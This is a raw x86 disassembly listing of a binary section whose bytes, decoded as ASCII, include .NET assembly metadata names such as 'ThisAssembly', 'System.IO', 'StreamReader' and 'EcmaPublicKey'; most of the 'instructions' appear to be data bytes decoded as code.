  4064bd:	add    BYTE PTR [eax],ch
  4064bf:	add    BYTE PTR [ebp+0x2c000e00],bh
  4064c5:	add    dl,al
  4064c7:	add    BYTE PTR [esi],cl
  4064c9:	add    BYTE PTR [eax],dh
  4064cb:	add    dl,al
  4064cd:	add    BYTE PTR [esi],cl
  4064cf:	add    BYTE PTR [eax+eax*1],dh
  4064d2:	jecxz  0x4064d4
  4064d4:	push   cs
  4064d5:	add    BYTE PTR [eax],bh
  4064d7:	add    BYTE PTR [ecx+eax*1],ah
  4064da:	push   cs
  4064db:	add    BYTE PTR [eax+eax*1],bh
  4064de:	mov    esp,0x40000e01
  4064e3:	add    BYTE PTR [edx+0x2],bl
  4064e6:	push   cs
  4064e7:	add    BYTE PTR [eax+eax*1+0x12],al
  4064eb:	add    ecx,DWORD PTR [esi]
  4064ed:	add    BYTE PTR [eax+0x0],cl
  4064f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4064f1:	add    ecx,DWORD PTR [esi]
  4064f3:	add    BYTE PTR [eax+eax*1+0x5c],cl
  4064f7:	add    al,0xe
  4064f9:	add    BYTE PTR [eax+0x0],dl
  4064fc:	or     al,0x5
  4064fe:	push   cs
  4064ff:	add    BYTE PTR [eax+eax*1-0x58],dl
  406503:	add    eax,0x58000e
  406508:	test   al,0x5
  40650a:	push   cs
  40650b:	add    BYTE PTR [eax+eax*1-0x37],bl
  40650f:	add    eax,0x60000e
  406514:	dec    ebx
  406515:	or     BYTE PTR [esi],cl
  406517:	add    BYTE PTR [eax+eax*1+0x4b],ah
  40651b:	or     BYTE PTR [esi],cl
  40651d:	add    BYTE PTR [eax+0x0],ch
  406520:	ins    BYTE PTR es:[edi],dx
  406521:	or     BYTE PTR [esi],cl
  406523:	add    BYTE PTR [eax+eax*1-0x12],ch
  406527:	or     cl,BYTE PTR [esi]
  406529:	add    BYTE PTR [eax+0x0],dh
  40652c:	ror    BYTE PTR [ebx],0xe
  40652f:	add    BYTE PTR [eax+eax*1+0x70],dh
  406533:	or     al,0xe
  406535:	add    BYTE PTR [eax+0x0],bh
  406538:	xor    BYTE PTR ds:0x7c000e,cl
  40653e:	fimul  DWORD PTR ds:0x80000e
  406544:	jl     0x406554
  406546:	push   cs
  406547:	add    BYTE PTR [eax+eax*1+0xe0f34],al
  40654e:	mov    BYTE PTR [eax],al
  406550:	out    0xf,al
  406552:	push   cs
  406553:	add    BYTE PTR [eax+eax*1+0xe108a],cl
  40655a:	nop
  40655b:	add    BYTE PTR [ecx+edx*1+0xe],al
  40655f:	add    BYTE PTR [eax+eax*1+0xe11ee],dl
  406566:	cwde   
  406567:	add    BYTE PTR [esi-0x63fff1ee],dl
  40656d:	add    BYTE PTR [esi+0x13],dh
  406570:	push   cs
  406571:	add    BYTE PTR [eax+0xe141c00],ah
  406577:	add    BYTE PTR [eax+eax*1+0xe14ce],ah
  40657e:	test   al,0x0
  406580:	push   0x15
  406582:	push   cs
  406583:	add    BYTE PTR [eax+eax*1+0xe1620],ch
  40658a:	mov    al,0x0
  40658c:	aam    0x16
  40658e:	push   cs
  40658f:	add    BYTE PTR [eax+eax*1+0xe1796],dh
  406596:	mov    eax,0xe184e00
  40659b:	add    BYTE PTR [eax+eax*1+0xe1900],bh
  4065a2:	rol    BYTE PTR [eax],0xc0
  4065a5:	sbb    DWORD PTR [esi],ecx
  4065a7:	add    ah,al
  4065a9:	add    BYTE PTR [edx+0x1a],ch
  4065ac:	push   cs
  4065ad:	add    al,cl
  4065af:	add    BYTE PTR [ebx+ebx*1],ch
  4065b2:	push   cs
  4065b3:	add    ah,cl
  4065b5:	add    al,bl
  4065b7:	sbb    ecx,DWORD PTR [esi]
  4065b9:	add    al,dl
  4065bb:	add    BYTE PTR [esi-0x2bfff1e4],al
  4065c1:	add    BYTE PTR [edx],bh
  4065c3:	sbb    eax,0xd8000e
  4065c8:	or     bl,BYTE PTR [esi]
  4065ca:	push   cs
  4065cb:	add    ah,bl
  4065cd:	add    BYTE PTR [eax-0x1ffff1e2],bh
  4065d3:	add    cl,bl
  4065d5:	push   ds
  4065d6:	push   cs
  4065d7:	add    ah,ah
  4065d9:	add    BYTE PTR [ebp-0x17fff1e1],cl
  4065df:	add    BYTE PTR ds:0xec000e20,bh
  4065e5:	add    cl,bh
  4065e7:	and    BYTE PTR [esi],cl
  4065e9:	add    al,dh
  4065eb:	add    BYTE PTR [edi-0xbfff1df],dh
  4065f1:	add    BYTE PTR [ebp+0x22],dh
  4065f4:	push   cs
  4065f5:	add    BYTE PTR [eax],al
  4065f7:	add    DWORD PTR [ebp+0x23],eax
  4065fa:	push   cs
  4065fb:	add    BYTE PTR [ecx+eax*1],al
  4065fe:	outs   dx,BYTE PTR ds:[esi]
  4065ff:	and    ecx,DWORD PTR [esi]
  406601:	add    BYTE PTR [eax],cl
  406603:	add    DWORD PTR [edi+0xc000e23],edx
  406609:	add    DWORD PTR [eax+0x10000e23],esi
  40660f:	add    edi,eax
  406611:	and    ecx,DWORD PTR [esi]
  406613:	add    BYTE PTR [ecx+eax*1],dl
  406616:	fsub   QWORD PTR [ebx]
  406618:	push   cs
  406619:	add    BYTE PTR [eax],bl
  40661b:	add    edi,esi
  40661d:	and    ecx,DWORD PTR [esi]
  40661f:	add    BYTE PTR [ecx+eax*1],bl
  406622:	and    al,0x24
  406624:	push   cs
  406625:	add    BYTE PTR [eax],ah
  406627:	add    DWORD PTR [edi],edi
  406629:	and    al,0xe
  40662b:	add    BYTE PTR [ecx+eax*1],ah
  40662e:	bound  esp,QWORD PTR [esi+ecx*1]
  406631:	add    BYTE PTR [eax],ch
  406633:	add    DWORD PTR [edi+0x24],esi
  406636:	push   cs
  406637:	add    BYTE PTR [ecx+eax*1],ch
  40663a:	nop
  40663b:	and    al,0xe
  40663d:	add    BYTE PTR [eax],dh
  40663f:	add    DWORD PTR [ebp+0x34000e24],ebp
  406645:	add    esp,edx
  406647:	and    al,0xe
  406649:	add    BYTE PTR [eax],bh
  40664b:	add    ebp,esp
  40664d:	and    al,0xe
  40664f:	add    BYTE PTR [ecx+eax*1],bh
  406652:	push   es
  406653:	and    eax,0x140000e
  406658:	das    
  406659:	and    eax,0x144000e
  40665e:	inc    edx
  40665f:	and    eax,0x148000e
  406664:	dec    edi
  406665:	and    eax,0x14c000e
  40666a:	pop    esp
  40666b:	and    eax,0x150000e
  406670:	jne    0x406697
  406672:	push   cs
  406673:	add    BYTE PTR [ecx+eax*1-0x7c],dl
  406677:	and    eax,0x158000e
  40667c:	lahf   
  40667d:	and    eax,0x15c000e
  406682:	int3   
  406683:	and    eax,0x160000e
  406688:	stc    
  406689:	and    eax,0x164000e
  40668e:	push   ds
  40668f:	es push cs
  406691:	add    BYTE PTR [eax+0x1],ch
  406694:	xor    esp,DWORD PTR [esi]
  406696:	push   cs
  406697:	add    BYTE PTR [ecx+eax*1+0x58],ch
  40669b:	es push cs
  40669d:	add    BYTE PTR [eax+0x1],dh
  4066a0:	arpl   WORD PTR [esi],sp
  4066a2:	push   cs
  4066a3:	add    BYTE PTR [ecx+eax*1-0x6c],dh
  4066a7:	es push cs
  4066a9:	add    BYTE PTR [eax+0x1],bh
  4066ac:	mov    ebp,0x7c000e26
  4066b1:	add    esi,ebx
  4066b3:	es push cs
  4066b5:	add    BYTE PTR [eax+0xe271301],al
  4066bb:	add    BYTE PTR [ecx+eax*1+0xe275d],cl
  4066c2:	nop
  4066c3:	add    DWORD PTR [esi+0x27],esi
  4066c6:	push   cs
  4066c7:	add    BYTE PTR [ecx+eax*1+0xe278f],dl
  4066ce:	cwde   
  4066cf:	add    DWORD PTR [eax-0x63fff1d9],ebp
  4066d5:	add    ecx,eax
  4066d7:	daa    
  4066d8:	push   cs
  4066d9:	add    BYTE PTR [eax+0xe27d401],ah
  4066df:	add    BYTE PTR [ecx+eax*1+0xe27eb],ah
  4066e6:	test   al,0x1
  4066e8:	add    BYTE PTR [eax],ch
  4066ea:	push   cs
  4066eb:	add    BYTE PTR [ecx+eax*1+0xe2813],ch
  4066f2:	mov    al,0x1
  4066f4:	sub    al,0x28
  4066f6:	push   cs
  4066f7:	add    BYTE PTR [ecx+eax*1+0xe2845],dh
  4066fe:	mov    eax,0xe285c01
  406703:	add    BYTE PTR [ecx+eax*1+0xe2875],bh
  40670a:	rol    BYTE PTR [ecx],0x84
  40670d:	sub    BYTE PTR [esi],cl
  40670f:	add    ah,al
  406711:	add    DWORD PTR [ebp-0x37fff1d8],edx
  406717:	add    DWORD PTR [eax-0x33fff1d8],ebp
  40671d:	add    DWORD PTR [ebx-0x2ffff1d8],edi
  406723:	add    eax,edx
  406725:	sub    BYTE PTR [esi],cl
  406727:	add    ah,dl
  406729:	add    ecx,ebp
  40672b:	sub    BYTE PTR [esi],cl
  40672d:	add    al,bl
  40672f:	add    DWORD PTR [edx],eax
  406731:	sub    DWORD PTR [esi],ecx
  406733:	add    ah,bl
  406735:	add    DWORD PTR [ecx],esp
  406737:	sub    DWORD PTR [esi],ecx
  406739:	add    al,ah
  40673b:	add    DWORD PTR [edx],edi
  40673d:	sub    DWORD PTR [esi],ecx
  40673f:	add    ah,ah
  406741:	add    DWORD PTR [ebp+0x29],ecx
  406744:	push   cs
  406745:	add    al,ch
  406747:	add    DWORD PTR [ecx+ebp*1+0xe],esp
  40674b:	add    ah,ch
  40674d:	add    DWORD PTR [ebp+0x29],edi
  406750:	push   cs
  406751:	add    al,dh
  406753:	add    DWORD PTR [edx-0xbfff1d7],edx
  406759:	add    DWORD PTR [ecx-0x7fff1d7],ebp
  40675f:	add    DWORD PTR [ecx+ebp*1+0x1fc000e],edi
  406766:	aad    0x29
  406768:	push   cs
  406769:	add    BYTE PTR [eax],al
  40676b:	add    ch,dh
  40676d:	sub    DWORD PTR [esi],ecx
  40676f:	add    BYTE PTR [edx+eax*1],al
  406772:	add    eax,0x8000e2a
  406777:	add    bl,BYTE PTR [esi]
  406779:	sub    cl,BYTE PTR [esi]
  40677b:	add    BYTE PTR [edx+eax*1],cl
  40677e:	xor    eax,0x10000e2a
  406783:	add    cl,BYTE PTR [edx+ebp*1+0xe]
  406787:	add    BYTE PTR [edx+eax*1],dl
  40678a:	popa   
  40678b:	sub    cl,BYTE PTR [esi]
  40678d:	add    BYTE PTR [eax],bl
  40678f:	add    al,BYTE PTR [eax+0x1c000e2a]
  406795:	add    cl,BYTE PTR [edi+0x2000082a]
  40679b:	add    ah,BYTE PTR [edx+ebp*1+0x2640008]
  4067a2:	jae    0x4067cf
  4067a4:	or     BYTE PTR [eax],al
  4067a6:	push   0x82b7802
  4067ab:	add    BYTE PTR [edx+eax*1+0x7d],ch
  4067af:	sub    ebp,DWORD PTR [esi]
  4067b1:	add    BYTE PTR [ebx+0x0],dl
  4067b4:	xchg   ebx,eax
  4067b5:	das    
  4067b6:	add    BYTE PTR cs:[ebx+0x0],bl
  4067ba:	mov    bl,0x2f
  4067bc:	add    BYTE PTR cs:[ebx+0x2e304800],ah
  4067c3:	add    BYTE PTR [ebx],ah
  4067c5:	add    BYTE PTR [edi+ebp*1+0x2e],bl
  4067c9:	add    BYTE PTR [ebx],ch
  4067cb:	add    BYTE PTR [edx+0x2f],ah
  4067ce:	add    BYTE PTR cs:[ebx],dh
  4067d1:	add    BYTE PTR [eax+0x2f],ch
  4067d4:	add    BYTE PTR cs:[ebx],bh
  4067d7:	add    BYTE PTR [eax+0x2f],ch
  4067da:	add    BYTE PTR cs:[ebx+0x0],al
  4067de:	push   0x4b002e2f
  4067e3:	add    BYTE PTR [eax+0x2f],bh
  4067e6:	add    BYTE PTR cs:[ebx+0x2e305100],ch
  4067ed:	add    BYTE PTR [ebx+0x0],ch
  4067f0:	call   0x73409624
  4067f5:	add    al,ch
  4067f7:	das    
  4067f8:	add    BYTE PTR cs:[ebx+0x0],bh
  4067fc:	cld    
  4067fd:	das    
  4067fe:	add    BYTE PTR cs:[ebx+0x2e300900],al
  406805:	add    BYTE PTR [ebx+0x2e2f6200],cl
  40680b:	add    BYTE PTR [ebx+0x2e301400],dl
  406811:	add    BYTE PTR [ebx-0x3bcfc100],bl
  406817:	add    BYTE PTR [ebx],cl
  406819:	add    BYTE PTR [eax+0x2b],bh
  40681c:	add    eax,DWORD PTR [ecx]
  40681e:	retf   
  40681f:	add    BYTE PTR [esp+ebp*1+0x23],cl
  406823:	add    ebx,ecx
  406825:	add    BYTE PTR [esp+ebp*1+0x72],cl
  406829:	sub    al,0x94
  40682b:	sub    al,0xb3
  40682d:	sub    al,0xc7
  40682f:	sub    al,0xda
  406831:	sub    al,0x21
  406833:	sub    eax,0x2d702d5d
  406838:	xchg   ebp,eax
  406839:	sub    eax,0x2e6a2de5
  40683e:	sahf   
  40683f:	cs mov ch,0x2e
  406842:	xlat   BYTE PTR ds:[ebx]
  406843:	cs repz add BYTE PTR cs:[edi],ch
  406848:	sbb    BYTE PTR [edi],ch
  40684a:	cmp    eax,0x72f572f
  40684f:	add    BYTE PTR [ecx],al
  406851:	add    BYTE PTR [eax],cl
  406853:	add    BYTE PTR [ebx],al
  406855:	add    BYTE PTR [edx],cl
  406857:	add    BYTE PTR [eax+eax*1],al
  40685a:	or     eax,0xe000600
  40685f:	add    BYTE PTR [ebx],cl
  406861:	add    BYTE PTR [edi],cl
  406863:	add    BYTE PTR ds:0x40000000,cl
  406869:	push   es
  40686a:	sub    al,0x23
  40686c:	add    BYTE PTR [eax],al
  40686e:	push   esp
  40686f:	push   es
  406870:	sub    al,0x23
  406872:	add    BYTE PTR [eax],al
  406874:	add    DWORD PTR [ecx],0x3c
  406877:	and    eax,DWORD PTR [eax]
  406879:	add    BYTE PTR [ebx],al
  40687b:	or     DWORD PTR [ebx+0x27],edx
  40687e:	add    BYTE PTR [eax],al
  406880:	or     ecx,DWORD PTR [ecx]
  406882:	pop    eax
  406883:	daa    
  406884:	add    BYTE PTR [eax],al
  406886:	xchg   BYTE PTR [esp+edi*1],cl
  406889:	and    eax,DWORD PTR [eax]
  40688b:	add    BYTE PTR [edi+0x233c0c],cl
  406891:	add    BYTE PTR [ecx+0x233c0c],bl
  406897:	add    BYTE PTR [ebx+0x233c0c],ah
  40689d:	add    BYTE PTR [edx+0x2b450c],dh
  4068a3:	add    BYTE PTR ds:0x2b630d,ah
  4068a9:	add    BYTE PTR [eax],dh
  4068ab:	or     eax,0x2b63
  4068b0:	pop    esp
  4068b1:	or     eax,0x233c
  4068b6:	and    eax,0x2b630d
  4068bb:	add    BYTE PTR [eax],dh
  4068bd:	or     eax,0x22b63
  4068c2:	add    al,BYTE PTR [eax]
  4068c4:	add    eax,DWORD PTR [eax]
  4068c6:	add    al,BYTE PTR [eax]
  4068c8:	add    eax,DWORD PTR [eax]
  4068ca:	add    eax,0x6000200
  4068cf:	add    BYTE PTR [edi],al
  4068d1:	add    BYTE PTR [edx],al
  4068d3:	add    BYTE PTR [ebx],cl
  4068d5:	add    BYTE PTR [ecx],cl
  4068d7:	add    BYTE PTR [edx],al
  4068d9:	add    BYTE PTR [eax+eax*1],cl
  4068dc:	or     eax,DWORD PTR [eax]
  4068de:	add    al,BYTE PTR [eax]
  4068e0:	add    BYTE PTR cs:0x2f000200,cl
  4068e7:	add    BYTE PTR [edi],cl
  4068e9:	add    BYTE PTR [edx],al
  4068eb:	add    BYTE PTR [eax],dh
  4068ed:	add    BYTE PTR [ecx],dl
  4068ef:	add    BYTE PTR [edx],al
  4068f1:	add    BYTE PTR [ecx],dh
  4068f3:	add    BYTE PTR [ebx],dl
  4068f5:	add    BYTE PTR [edx],al
  4068f7:	add    BYTE PTR [edx],dh
  4068f9:	add    BYTE PTR ds:0x33000100,dl
  4068ff:	add    BYTE PTR ds:0x3a000200,dl
  406905:	add    BYTE PTR [edi],dl
  406907:	add    BYTE PTR [edx],al
  406909:	add    BYTE PTR [ebx],bh
  40690b:	add    BYTE PTR [ecx],bl
  40690d:	add    BYTE PTR [edx],al
  40690f:	add    BYTE PTR ds:0x2001b00,bh
  406915:	add    BYTE PTR [esi],bh
  406917:	add    BYTE PTR ds:0x3f000200,bl
  40691d:	add    BYTE PTR [edi],bl
  40691f:	add    BYTE PTR [eax],cl
  406921:	sub    eax,0x80042dc9
  406926:	add    BYTE PTR [eax],al
  406928:	add    eax,DWORD PTR [eax]
  40692a:	add    eax,0x0
  40692f:	add    BYTE PTR [ecx],al
  406931:	add    BYTE PTR [eax],al
  406933:	add    BYTE PTR [edi+0xb02b],dl
  406939:	add    BYTE PTR [edx],al
	...
  406943:	add    BYTE PTR [eax],al
  406945:	add    BYTE PTR [ecx],al
  406947:	add    BYTE PTR [edx],al
  406949:	add    DWORD PTR [eax],eax
  40694b:	add    BYTE PTR [eax],al
  40694d:	add    BYTE PTR [edx],al
	...
  406957:	add    BYTE PTR [eax],al
  406959:	add    BYTE PTR [ecx],al
  40695b:	add    BYTE PTR [ecx+0x0],ch
  406961:	add    BYTE PTR [edx],al
	...
  40696b:	add    BYTE PTR [eax],al
  40696d:	add    BYTE PTR [ecx],al
  40696f:	add    bl,cl
  406971:	adc    eax,DWORD PTR [eax]
  406973:	add    BYTE PTR [eax],al
  406975:	add    BYTE PTR [edx],al
	...
  40697f:	add    BYTE PTR [eax],al
  406981:	add    BYTE PTR [edx],cl
  406983:	cs aaa 
  406985:	adc    eax,0x0
  40698a:	add    al,BYTE PTR [eax]
	...
  406994:	add    BYTE PTR [eax],al
  406996:	add    DWORD PTR [eax],eax
  406998:	ja     0x4069b0
	...
  4069a2:	add    DWORD PTR [eax],eax
  4069a4:	add    BYTE PTR [eax],al
  4069a6:	std    
  4069a7:	pop    ss
  4069a8:	add    BYTE PTR [eax],al
  4069aa:	cwde   
  4069ab:	push   ss
  4069ac:	add    BYTE PTR [eax],al
  4069ae:	add    DWORD PTR [eax],eax
  4069b0:	add    BYTE PTR [eax],al
  4069b2:	or     bl,BYTE PTR [eax]
  4069b4:	add    BYTE PTR [eax],al
  4069b6:	or     eax,0xe000c00
  4069bb:	add    BYTE PTR [eax+eax*1],cl
  4069be:	str    WORD PTR [eax+eax*1]
  4069c2:	adc    BYTE PTR [eax],al
  4069c4:	or     al,0x0
  4069c6:	adc    DWORD PTR [eax],eax
  4069c8:	or     al,0x0
  4069ca:	inc    ebx
  4069cb:	add    BYTE PTR [ebp+0x2c],ch
  4069ce:	add    BYTE PTR [eax],al
  4069d0:	add    BYTE PTR [ecx*2+0x6c75646f],bh
  4069d7:	gs add BYTE PTR ds:[edx+0x65],dl
  4069dc:	jae    0x406a25
  4069de:	outs   dx,BYTE PTR gs:[esi]
  4069e0:	cs gs js 0x406a49
  4069e4:	add    BYTE PTR [esi+0x58],al
  4069e7:	xor    dh,BYTE PTR [eax]
  4069e9:	inc    ecx
  4069ea:	jae    0x406a5f
  4069ec:	gs ins DWORD PTR es:[edi],dx
  4069ee:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  4069f2:	inc    esi
  4069f3:	pop    eax
  4069f4:	xor    esi,DWORD PTR ds:0x65737341
  4069fa:	ins    DWORD PTR es:[edi],dx
  4069fb:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  4069ff:	inc    esi
  406a00:	pop    eax
  406a01:	inc    ecx
  406a02:	jae    0x406a77
  406a04:	gs ins DWORD PTR es:[edi],dx
  406a06:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  406a0a:	push   esp
  406a0b:	push   0x73417369
  406a10:	jae    0x406a77
  406a12:	ins    DWORD PTR es:[edi],dx
  406a13:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  406a17:	inc    ecx
  406a18:	jae    0x406a8d
  406a1a:	gs ins DWORD PTR es:[edi],dx
  406a1c:	bound  ebp,QWORD PTR [ecx+edi*2+0x52]
  406a20:	data16 add BYTE PTR gs:[ebx+0x6f],al
  406a25:	ins    DWORD PTR es:[edi],dx
  406a26:	ins    DWORD PTR es:[edi],dx
  406a27:	outs   dx,DWORD PTR ds:[esi]
  406a28:	outs   dx,BYTE PTR ds:[esi]
  406a29:	push   edx
  406a2a:	gs jae 0x406a80
  406a2d:	je     0x406aa1
  406a2f:	imul   ebp,DWORD PTR [esi+0x67],0x52530073
  406a36:	inc    esp
  406a37:	gs jae 0x406a9d
  406a3a:	jb     0x406aa5
  406a3c:	jo     0x406ab2
  406a3e:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  406a45:	imul   esp,DWORD PTR [edx+0x75],0x53006574
  406a4c:	jns    0x406ac1
  406a4e:	je     0x406ab5
  406a50:	ins    DWORD PTR es:[edi],dx
  406a51:	cs push esp
  406a53:	outs   dx,DWORD PTR ds:[esi]
  406a54:	outs   dx,DWORD PTR ds:[esi]
  406a55:	ins    BYTE PTR es:[edi],dx
  406a56:	jae    0x406a58
  406a58:	push   ebx
  406a59:	push   edx
  406a5a:	inc    ebx
  406a5b:	popa   
  406a5c:	je     0x406ac3
  406a5e:	outs   dx,DWORD PTR ds:[si]
  406a60:	jb     0x406adb
  406a62:	inc    ecx
  406a63:	je     0x406ad9
  406a65:	jb     0x406ad0
  406a67:	bound  esi,QWORD PTR [ebp+0x74]
  406a6a:	add    BYTE PTR gs:[ebx+0x52],dl
  406a6e:	add    BYTE PTR [ebp+0x78],al
  406a71:	je     0x406ad8
  406a73:	jb     0x406ae3
  406a75:	inc    esp
  406a76:	ins    BYTE PTR es:[edi],dx
  406a77:	ins    BYTE PTR es:[edi],dx
  406a78:	add    BYTE PTR [ebx+0x79],dl
  406a7b:	jae    0x406af1
  406a7d:	gs ins DWORD PTR es:[edi],dx
  406a7f:	add    BYTE PTR [edx+0x65],dl
  406a82:	jae    0x406acb
  406a84:	outs   dx,BYTE PTR gs:[esi]
  406a86:	add    BYTE PTR [edx+0x65],dl
  406a89:	jae    0x406afa
  406a8b:	jne    0x406aff
  406a8d:	arpl   WORD PTR [ebp+0x43],sp
  406a90:	ins    BYTE PTR es:[edi],dx
  406a91:	popa   
  406a92:	jae    0x406b07
  406a94:	dec    edi
  406a95:	jo     0x406b0b
  406a97:	imul   ebp,DWORD PTR [edi+0x6e],0x694c0073
  406a9e:	outs   dx,BYTE PTR ds:[esi]
  406a9f:	gs dec esi
  406aa1:	jne    0x406b10
  406aa3:	bound  esp,QWORD PTR [ebp+0x72]
  406aa6:	push   ebx
  406aa7:	je     0x406b1b
  406aa9:	gs popa 
  406aab:	ins    DWORD PTR es:[edi],dx
  406aac:	push   edx
  406aad:	gs popa 
  406aaf:	fs gs jb 0x406ab3
  406ab3:	push   esp
  406ab4:	gs js  0x406b2b
  406ab7:	inc    esi
  406ab8:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0x70656378
  406ac0:	je     0x406b2b
  406ac2:	outs   dx,DWORD PTR ds:[esi]
  406ac3:	outs   dx,BYTE PTR ds:[esi]
  406ac4:	add    BYTE PTR [esi+0x6f],al
  406ac7:	jb     0x406b36
  406ac9:	popa   
  406aca:	je     0x406acc
  406acc:	inc    ebp
  406acd:	outs   dx,BYTE PTR ds:[esi]
  406ace:	je     0x406b42
  406ad0:	jns    0x406ad2
  406ad2:	ins    DWORD PTR es:[edi],dx
  406ad3:	jae    0x406b38
  406ad5:	outs   dx,DWORD PTR ds:[esi]
  406ad6:	jb     0x406b44
  406ad8:	imul   esp,DWORD PTR [edx+0x0],0x656a624f
  406adf:	arpl   WORD PTR [eax+eax*1+0x53],si
  406ae3:	jns    0x406b58
  406ae5:	je     0x406b4c
  406ae7:	ins    DWORD PTR es:[edi],dx
  406ae8:	cs inc ebx
  406aea:	outs   dx,DWORD PTR ds:[esi]
  406aeb:	ins    DWORD PTR es:[edi],dx
  406aec:	jo     0x406b5d
  406aee:	outs   dx,BYTE PTR ds:[esi]
  406aef:	outs   dx,BYTE PTR gs:[esi]
  406af1:	je     0x406b40
  406af3:	outs   dx,DWORD PTR ds:[esi]
  406af4:	fs gs ins BYTE PTR es:[edi],dx
  406af7:	add    BYTE PTR [ebp+eiz*2+0x73],al
  406afb:	arpl   WORD PTR [edx+0x69],si
  406afe:	jo     0x406b74
  406b00:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  406b07:	imul   esp,DWORD PTR [edx+0x75],0x43006574
  406b0e:	popa   
  406b0f:	je     0x406b76
  406b11:	outs   dx,DWORD PTR ds:[si]
  406b13:	jb     0x406b8e
  406b15:	inc    ecx
  406b16:	je     0x406b8c
  406b18:	jb     0x406b83
  406b1a:	bound  esi,QWORD PTR [ebp+0x74]
  406b1d:	add    BYTE PTR gs:[ebx+0x79],dl
  406b21:	jae    0x406b97
  406b23:	gs ins DWORD PTR es:[edi],dx
  406b25:	cs dec ecx
  406b27:	dec    edi
  406b28:	add    BYTE PTR [ebx+0x74],dl
  406b2b:	jb     0x406b92
  406b2d:	popa   
  406b2e:	ins    DWORD PTR es:[edi],dx
  406b2f:	push   edx
  406b30:	gs popa 
  406b32:	fs gs jb 0x406b36
  406b36:	inc    ebp
  406b37:	js     0x406b9c
  406b39:	gs jo  0x406bb0
  406b3c:	imul   ebp,DWORD PTR [edi+0x6e],0x756e4500
  406b43:	ins    DWORD PTR es:[edi],dx
  406b44:	add    BYTE PTR [esi+0x65],dl
  406b47:	jb     0x406bbc
  406b49:	imul   ebp,DWORD PTR [edi+0x6e],0x74695400
  406b50:	ins    BYTE PTR es:[edi],dx
  406b51:	add    BYTE PTR gs:[ebp+eiz*2+0x73],al
  406b56:	arpl   WORD PTR [edx+0x69],si
  406b59:	jo     0x406bcf
  406b5b:	imul   ebp,DWORD PTR [edi+0x6e],0x66654400
  406b62:	popa   
  406b63:	jne    0x406bd1
  406b65:	je     0x406ba8
  406b67:	ins    BYTE PTR es:[edi],dx
  406b68:	imul   esp,DWORD PTR [ecx+0x73],0x706f4300
  406b6f:	jns    0x406be3
  406b71:	imul   esp,DWORD PTR [edi+0x68],0x6e490074
  406b78:	outs   dx,WORD PTR ds:[esi]
  406b7a:	jb     0x406be9
  406b7c:	popa   
  406b7d:	je     0x406be8
  406b7f:	outs   dx,DWORD PTR ds:[esi]
  406b80:	outs   dx,BYTE PTR ds:[esi]
  406b81:	popa   
  406b82:	ins    BYTE PTR es:[edi],dx
  406b83:	push   esi
  406b84:	gs jb  0x406bfa
  406b87:	imul   ebp,DWORD PTR [edi+0x6e],0x69614400
  406b8e:	ins    BYTE PTR es:[edi],dx
  406b8f:	jns    0x406bd3
  406b91:	jne    0x406bfc
  406b93:	ins    BYTE PTR es:[edi],dx
  406b94:	fs dec esi
  406b96:	jne    0x406c05
  406b98:	bound  esp,QWORD PTR [ebp+0x72]
  406b9b:	add    BYTE PTR [ebp+0x63],al
  406b9e:	ins    DWORD PTR es:[edi],dx
  406b9f:	popa   
  406ba0:	push   eax
  406ba1:	jne    0x406c05
  406ba3:	ins    BYTE PTR es:[edi],dx
  406ba4:	imul   esp,DWORD PTR [ebx+0x4b],0x45007965
  406bab:	arpl   WORD PTR [ebp+0x61],bp
  406bae:	push   eax
  406baf:	jne    0x406c13
  406bb1:	ins    BYTE PTR es:[edi],dx
  406bb2:	imul   esp,DWORD PTR [ebx+0x4b],0x6f547965
  406bb9:	imul   esp,DWORD PTR [ebp+0x6e],0x0
  406bbd:	inc    ebp
  406bbe:	arpl   WORD PTR [ebp+0x61],bp
  406bc1:	push   eax
  406bc2:	jne    0x406c26
  406bc4:	ins    BYTE PTR es:[edi],dx
  406bc5:	imul   esp,DWORD PTR [ebx+0x4b],0x75467965
  406bcc:	ins    BYTE PTR es:[edi],dx
  406bcd:	ins    BYTE PTR es:[edi],dx
  406bce:	add    BYTE PTR [ebp+0x73],cl
  406bd1:	arpl   WORD PTR [edi+0x72],bp
  406bd4:	ins    BYTE PTR es:[edi],dx
  406bd5:	imul   esp,DWORD PTR [edx+0x0],0x74737953
  406bdc:	gs ins DWORD PTR es:[edi],dx
  406bde:	inc    esp
  406bdf:	popa   
  406be0:	je     0x406c43
  406be2:	add    BYTE PTR [ebx+0x79],dl
  406be5:	jae    0x406c5b
  406be7:	gs ins DWORD PTR es:[edi],dx
  406be9:	inc    esp
  406bea:	popa   
  406beb:	je     0x406c4e
  406bed:	dec    edi
  406bee:	jb     0x406c51
  406bf0:	arpl   WORD PTR [ebp+eiz*2+0x43],bp
  406bf4:	ins    BYTE PTR es:[edi],dx
  406bf5:	imul   esp,DWORD PTR [ebp+0x6e],0x79530074
  406bfc:	jae    0x406c72
  406bfe:	gs ins DWORD PTR es:[edi],dx
  406c00:	push   edx
  406c01:	jne    0x406c71
  406c03:	je     0x406c6e
  406c05:	ins    DWORD PTR es:[edi],dx
  406c06:	gs push edx
  406c08:	gs ins DWORD PTR es:[edi],dx
  406c0a:	outs   dx,DWORD PTR ds:[esi]
  406c0b:	je     0x406c76
  406c0d:	outs   dx,BYTE PTR ds:[esi]
  406c0e:	add    BYTE PTR [bp+di+0x79],dl
  406c12:	jae    0x406c88
  406c14:	gs ins DWORD PTR es:[edi],dx
  406c16:	push   edi
  406c17:	imul   ebp,DWORD PTR [esi+0x64],0x4673776f
  406c1e:	outs   dx,DWORD PTR ds:[esi]
  406c1f:	jb     0x406c8e
  406c21:	jae    0x406c23
  406c23:	push   ebx
  406c24:	jns    0x406c99
  406c26:	je     0x406c8d
  406c28:	ins    DWORD PTR es:[edi],dx
  406c29:	pop    eax
  406c2a:	ins    DWORD PTR es:[edi],dx
  406c2b:	ins    BYTE PTR es:[edi],dx
  406c2c:	add    BYTE PTR [ebp+0x69],cl
  406c2f:	arpl   WORD PTR [edx+0x6f],si
  406c32:	jae    0x406ca3
  406c34:	data16 je 0x406c87
  406c37:	jne    0x406c9b
  406c39:	ins    BYTE PTR es:[edi],dx
  406c3a:	imul   esp,DWORD PTR [ebx+0x4b],0x4d007965
  406c41:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
